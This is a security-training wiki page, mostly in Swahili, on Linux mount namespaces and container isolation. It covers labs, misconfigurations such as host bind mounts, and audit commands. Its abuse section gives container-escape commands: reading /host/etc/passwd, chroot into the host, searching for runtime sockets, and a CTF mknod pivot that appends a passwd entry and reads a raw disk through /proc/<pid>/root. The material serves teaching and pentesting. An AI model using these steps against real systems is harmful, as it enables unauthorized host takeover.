# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

The mount namespace controls the **mount table** that a process sees. Hii ni mojawapo ya sifa muhimu za kutenganisha container kwa sababu root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, na mounts nyingi za msaada zinazotegemea runtime zote zinaonyeshwa kupitia ile **mount table**. Michakato miwili inaweza zote kufikia `/`, `/proc`, `/sys`, au `/tmp`, lakini ni nini njia hizo zinarejelea hutegemea mount namespace walimo.

Kutoka kwa mtazamo wa container-security, mount namespace mara nyingi ni tofauti kati ya "hii ni neatly prepared application filesystem" na "mchakato huu unaweza moja kwa moja kuona au kuathiri host filesystem". Ndiyo sababu bind mounts, `hostPath` volumes, privileged mount operations, na writable `/proc` au `/sys` exposures zote zinahusiana na namespace hii.

## Uendeshaji

When a runtime launches a container, it usually creates a fresh mount namespace, prepares a root filesystem for the container, mounts procfs and other helper filesystems as needed, and then optionally adds bind mounts, tmpfs mounts, secrets, config maps, or host paths. Mara mchakato huo unaposimama ndani ya namespace, seti ya mounts anazoziona imegawika kwa kiasi kikubwa kutoka kwa muonekano wa default wa host. Host inaweza bado kuona filesystem halisi inayodumishwa chini, lakini container inaona toleo lililokusanywa kwa ajili yake na runtime.

## Maabara

Unaweza kuunda mount namespace binafsi kwa:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Ukifungua shell nyingine nje ya namespace hiyo na ukichunguza mount table, utaona kwamba tmpfs mount ipo tu ndani ya isolated mount namespace.
Hii ni zoezi lenye manufaa kwa sababu linaonyesha kuwa mount isolation sio nadharia tu; kernel kwa hakika inaonyesha mount table tofauti kwa process.
Ukifungua shell nyingine nje ya namespace hiyo na ukichunguza mount table, tmpfs mount itakuwa tu ndani ya isolated mount namespace.

Ndani ya containers, kulinganisha kwa haraka ni:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Mfano wa pili unaonyesha jinsi ilivyo rahisi kwa usanidi wa runtime kufungua pengo kubwa kupitia mpaka wa filesystem.

## Matumizi ya Runtime

Docker, Podman, containerd-based stacks, na CRI-O wote hutegemea private mount namespace kwa container za kawaida. Kubernetes inajenga juu ya utaratibu huo kwa volumes, projected secrets, config maps, na `hostPath` mounts. Incus/LXC environments pia hutegemea sana mount namespaces, hasa kwa sababu system containers mara nyingi huonyesha filesystems zenye utajiri na zinazo fanana zaidi na mashine kuliko application containers.

Hii ina maana kwamba unapopitia tatizo la filesystem la container, kawaida hauangalii tu quirk iliyotengwa ya Docker. Unatazama tatizo la mount-namespace na runtime-configuration linaloonekana kupitia jukwaa lolote lililozindua workload.

## Usanidi usio sahihi

Hitilafu iliyo wazi na hatari zaidi ni kufichua host root filesystem au njia nyingine nyeti ya host kupitia bind mount, kwa mfano `-v /:/host` au `hostPath` inayoweza kuandikwa katika Kubernetes. Katika hatua hiyo, swali si tena "je, container inaweza kwa namna fulani kutoroka?" bali ni "ni kiasi gani cha yaliyomo ya host yenye manufaa tayari yanaonekana moja kwa moja na yanaweza kuandikwa?" Writable host bind mount mara nyingi hubadilisha sehemu iliyosalia ya exploit kuwa suala rahisi la placement ya faili, chrooting, config modification, au runtime socket discovery.

Tatizo jingine la kawaida ni kufichua host `/proc` au `/sys` kwa njia ambazo zinavuka mtazamo salama wa container. Filesystems hizi si ordinary data mounts; ni interfaces kwa state ya kernel na process. Ikiwa workload inafikia toleo za host moja kwa moja, dhana nyingi nyuma ya container hardening zitakoma kutumika wazi.

Read-only protections pia ni muhimu. Read-only root filesystem haifanyi container kuwa salama kwa mucjizo, lakini huondoa kiasi kikubwa cha attacker staging space na kufanya persistence, helper-binary placement, na config tampering kuwa ngumu zaidi. Kinyume chake, writable root au writable host bind mount inampa attacker nafasi ya kuandaa hatua inayofuata.

## Matumizi mabaya

Wakati mount namespace inatumiwa vibaya, attackers kawaida hufanya mojawapo ya mambo manne. Wanakusanya **read host data** ambayo ingepaswa kubaki nje ya container. Wanabadilisha **host configuration** kupitia writable bind mounts. Wan **mount au remount additional resources** ikiwa capabilities na seccomp zinakuruhusu. Au wanafikilia **powerful sockets na runtime state directories** ambazo zinaowawezesha kuomba jukwaa la container wenyewe kwa upatikanaji zaidi.

Ikiwa container tayari inaweza kuona host filesystem, modeli yote ya usalama inabadilika mara moja.

Unaposhuku host bind mount, kwanza thibitisha kinachopatikana na kama kinaweza kuandikwa:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Ikiwa host root filesystem ime-mounted read-write, ufikiaji wa moja kwa moja wa host mara nyingi ni rahisi kama:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Ikiwa lengo ni ufikiaji wa runtime wenye ruhusa badala ya chrooting ya moja kwa moja, orodhesha sockets na runtime state:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Ikiwa `CAP_SYS_ADMIN` ipo, jaribu pia kama mounts mpya zinaweza kuundwa kutoka ndani ya container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Mfano Kamili: Two-Shell `mknod` Pivot

Njia maalum ya matumizi mabaya hujitokeza wakati mtumiaji root wa container anaweza kuunda block devices, host na container wanashiriki utambulisho wa mtumiaji kwa njia yenye manufaa, na mshambuliaji tayari ana foothold ya vibali vya chini kwenye host. Katika hali hiyo, container inaweza kuunda node ya kifaa kama `/dev/sda`, na mtumiaji wa host mwenye vibali vya chini anaweza baadaye kuisoma kupitia `/proc/<pid>/root/` kwa mchakato wa container unaolingana.

Inside the container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Kutoka kwenye host, kama mtumiaji wa low-privilege anayefanana baada ya kupata PID ya container shell:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Somo muhimu si utafutaji maalum wa CTF string. Somo ni kwamba kufichuliwa kwa mount-namespace kupitia `/proc/<pid>/root/` kunaweza kumruhusu mtumiaji wa host kutumia tena device nodes zilizoundwa na container hata wakati sera ya vifaa ya cgroup ilizuia matumizi ya moja kwa moja ndani ya container yenyewe.

## Ukaguzi

Maagizo haya yamewekwa ili kukuonyesha mtazamo wa filesystem ambamo mchakato wa sasa kwa kweli unaishi. Lengo ni kubaini mounts zilizotokana na host, njia nyeti zinazoweza kuandikwa, na chochote kinachoonekana pana zaidi kuliko root filesystem ya container ya kawaida ya programu.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- Bind mounts kutoka kwa host, hasa `/`, `/proc`, `/sys`, runtime state directories, au socket locations, zinapaswa kuonekana mara moja.
- Unexpected read-write mounts kwa kawaida ni muhimu zaidi kuliko idadi kubwa ya read-only helper mounts.
- `mountinfo` mara nyingi ni sehemu bora ya kuona kama njia ni kweli ilitokana na host au overlay-backed.

Vikaguzi hivi vinaweka wazi **ni rasilimali gani zinazoonekana katika namespace hii**, **zipi zimeletwa kutoka kwa host**, na **zipi kati yao zinaweza kuandikwa au ni nyeti kwa usalama**.
